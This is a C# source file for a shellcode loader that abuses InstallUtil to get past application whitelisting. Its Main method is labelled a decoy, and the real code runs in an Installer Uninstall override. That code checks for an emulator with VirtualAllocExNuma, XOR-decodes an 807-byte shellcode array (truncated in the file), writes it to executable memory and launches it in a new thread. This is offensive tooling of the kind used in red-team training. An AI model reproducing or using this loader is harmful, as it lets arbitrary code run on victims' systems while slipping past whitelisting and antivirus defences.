using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.Runtime.InteropServices;

namespace custom_installutil
{
    
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
    uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        public override void Uninstall(System.Collections.IDictionary savedState)
        {

                //Non-Emulated API
                IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
                if (mem == null)
                {
                    return;
                }

                // Shellcode
                byte[] buf = new byte[807] { 0x70, 0xc4, 0x0f, 0x68, 0x7c, 0x64, 0x40,.. };
                // End Shellcode

                // Decoding 
                // XOR decoding
                for (int i = 0; i < buf.Length; i++)
                {
                    buf[i] = (byte)(buf[i] ^ 0x8c);
                }
                // End Decoding

                int size = buf.Length;
                IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

                Marshal.Copy(buf, 0, addr, size);

                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                    IntPtr.Zero, 0, IntPtr.Zero);

                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
        }
}

